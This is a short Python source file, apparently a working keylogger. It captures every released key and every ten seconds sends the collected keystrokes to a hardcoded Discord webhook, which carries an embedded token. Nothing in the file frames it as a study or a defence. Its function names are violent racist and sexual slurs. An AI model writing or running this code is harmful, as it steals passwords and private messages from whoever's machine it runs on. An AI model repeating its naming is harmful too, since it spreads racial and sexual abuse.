import keyboard
import time
import requests
import threading

WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1233936474962006027/S_9gawpHi6_YPFADKB5Mbq6xJMz9HkhBozeWBg9MSlZdY7RTUqHu0IfR8se6h9J-Qok2'

keylogs = []

def killniggers():
    global keylogs

    if keylogs:
        keylogs_str = '\n'.join(keylogs)
        payload = {
            'content': keylogs_str
        }
        requests.post(WEBHOOK_URL, data=payload)
        keylogs = []
    threading.Timer(10, killniggers).start()

def rapeniggerwoman(event):
    global keylogs
    keylogs.append(event.name)
keyboard.on_release(callback=rapeniggerwoman)
killniggers()
while True:
    time.sleep(1)